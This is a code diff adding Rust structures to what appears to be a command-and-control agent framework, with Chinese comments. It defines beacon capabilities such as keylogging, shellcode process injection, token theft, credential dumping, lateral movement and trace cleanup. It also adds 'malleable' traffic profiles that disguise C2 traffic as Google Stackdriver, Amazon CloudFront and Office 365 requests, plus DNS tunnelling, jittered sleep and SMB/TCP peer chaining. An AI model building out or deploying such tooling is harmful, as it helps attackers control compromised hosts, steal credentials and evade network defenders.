@@ -467,6 +467,232 @@ impl C2Agent {
     }
 }
 
+// ============================================================
+// ============================================================
+
+/// Beacon 能力
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub enum BeaconCapability {
+    /// 执行系统命令
+    Execute,
+    /// 文件上传
+    Upload,
+    /// 文件下载
+    Download,
+    /// 屏幕截图
+    Screenshot,
+    /// 键盘记录
+    Keylog { duration_secs: u64 },
+    /// 进程注入
+    ProcessInject { pid: u32, shellcode: String },
+    /// 令牌窃取
+    TokenSteal { pid: u32 },
+    /// 端口扫描
+    PortScan { target: String, ports: Vec<u16> },
+    /// SOCKS代理
+    SocksProxy { bind_port: u16 },
+    /// 端口转发
+    PortForward { local_port: u16, remote_addr: String },
+    /// 凭据抓取
+    CredentialDump,
+    /// 横向移动
+    LateralMove { method: String, target: String, command: String },
+    /// 提权检测
+    PrivescCheck,
+    /// 清理痕迹
+    Cleanup,
+}
+
+/// Malleable C2 配置（流量伪装）
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct MalleableProfile {
+    /// 配置名称
+    pub name: String,
+    /// HTTP方法
+    pub http_method: String,
+    /// URI路径模式
+    pub uri_patterns: Vec<String>,
+    /// User-Agent伪装
+    pub user_agent: String,
+    /// 自定义HTTP头
+    pub headers: std::collections::HashMap<String, String>,
+    /// 心跳间隔抖动(秒)
+    pub jitter: u64,
+    /// DNS子域名（DNS隧道）
+    pub dns_subdomains: Option<Vec<String>>,
+    /// 休眠时间范围
+    pub sleep_range: Option<(u64, u64)>,
+    /// 加密的Malleable配置
+    pub encrypted: bool,
+}
+
+impl Default for MalleableProfile {
+    fn default() -> Self {
+        Self {
+            name: "google-stackdriver".to_string(),
+            http_method: "POST".to_string(),
+            uri_patterns: vec![
+                "/v2/entries:write".to_string(),
+                "/v2/entries:list".to_string(),
+                "/v3/projects/metricDescriptors".to_string(),
+            ],
+            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36".to_string(),
+            headers: {
+                let mut h = std::collections::HashMap::new();
+                h.insert("Content-Type".to_string(), "application/json".to_string());
+                h.insert("Accept".to_string(), "*/*".to_string());
+                h.insert("Authorization".to_string(), "Bearer ya29.a0AfH6SM".to_string());
+                h
+            },
+            jitter: 30,
+            dns_subdomains: Some(vec![
+                "cdn".to_string(), "api".to_string(), "static".to_string(),
+                "analytics".to_string(), "metrics".to_string(),
+            ]),
+            sleep_range: Some((5, 30)),
+            encrypted: true,
+        }
+    }
+}
+
+/// 预定义Malleable Profiles
+impl MalleableProfile {
+    /// Google Stackdriver伪装
+    pub fn google_stackdriver() -> Self {
+        Self::default()
+    }
+
+    /// Amazon CloudFront伪装
+    pub fn amazon_cloudfront() -> Self {
+        Self {
+            name: "amazon-cloudfront".to_string(),
+            http_method: "GET".to_string(),
+            uri_patterns: vec![
+                "/static/js/main.js".to_string(),
+                "/api/v1/events".to_string(),
+                "/metrics/collect".to_string(),
+            ],
+            user_agent: "aws-sdk-java/1.12.0 Linux/4.14.0 OpenJDK_64-Bit_Server_VM/25.302 Java/1.8.0_302".to_string(),
+            headers: {
+                let mut h = std::collections::HashMap::new();
+                h.insert("X-Amz-Date".to_string(), "20240101T000000Z".to_string());
+                h.insert("X-Amz-Content-SHA256".to_string(), "UNSIGNED-PAYLOAD".to_string());
+                h
+            },
+            ..Default::default()
+        }
+    }
+
+    /// Microsoft Office 365伪装
+    pub fn microsoft_o365() -> Self {
+        Self {
+            name: "microsoft-o365".to_string(),
+            http_method: "POST".to_string(),
+            uri_patterns: vec![
+                "/owa/service.svc".to_string(),
+                "/ews/exchange.asmx".to_string(),
+                "/autodiscover/autodiscover.xml".to_string(),
+            ],
+            user_agent: "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)".to_string(),
+            headers: {
+                let mut h = std::collections::HashMap::new();
+                h.insert("X-ClientId".to_string(), uuid::Uuid::new_v4().to_string());
+                h.insert("X-AnchorMailbox".to_string(), "user@corp.local".to_string());
+                h
+            },
+            ..Default::default()
+        }
+    }
+}
+
+/// Beacon管理器增强
+pub struct BeaconManager {
+    /// Agent列表
+    pub agents: std::collections::HashMap<String, AgentInfo>,
+    /// Malleable配置
+    pub profile: MalleableProfile,
+    /// P2P节点（SMB/TCP链）
+    pub p2p_peers: Vec<P2PPeer>,
+    /// 团队服务器成员
+    pub team_members: Vec<TeamMember>,
+}
+
+/// P2P节点
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct P2PPeer {
+    pub peer_id: String,
+    pub agent_id: String,
+    pub transport: P2PTransport,
+    pub address: String,
+    pub connected: bool,
+}
+
+/// P2P传输方式
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub enum P2PTransport {
+    SmbPipe { pipe_name: String },
+    TcpChain { host: String, port: u16 },
+}
+
+/// 团队服务器成员
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct TeamMember {
+    pub user_id: String,
+    pub username: String,
+    pub role: TeamRole,
+    pub connected_since: i64,
+}
+
+/// 团队角色
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub enum TeamRole {
+    Operator,
+    Observer,
+    Admin,
+}
+
+impl BeaconManager {
+    pub fn new(profile: MalleableProfile) -> Self {
+        Self {
+            agents: std::collections::HashMap::new(),
+            profile,
+            p2p_peers: Vec::new(),
+            team_members: Vec::new(),
+        }
+    }
+
+    /// 添加P2P节点
+    pub fn add_p2p_peer(&mut self, peer: P2PPeer) {
+        self.p2p_peers.push(peer);
+    }
+
+    /// 添加团队成员
+    pub fn add_team_member(&mut self, member: TeamMember) {
+        self.team_members.push(member);
+    }
+
+    /// 生成C2通信URI
+    pub fn get_uri(&self) -> String {
+        let idx = fast_index(self.profile.uri_patterns.len());
+        self.profile.uri_patterns[idx].clone()
+    }
+
+    /// 计算休眠时间（带抖动）
+    pub fn get_sleep_duration(&self) -> u64 {
+        if let Some((min, max)) = self.profile.sleep_range {
+            min + (fast_index((max - min) as usize) as u64)
+        } else {
+            10
+        }
+    }
+}
+
+fn fast_index(max: usize) -> usize {
+    use std::collections::hash_map::RandomState;
+    use std::hash::{BuildHasher, Hasher};
+    (RandomState::new().build_hasher().finish() as usize) % max.max(1)
+}
+
 /// 命令执行结果
 #[derive(Debug, Clone)]
 pub struct CommandExecResult {
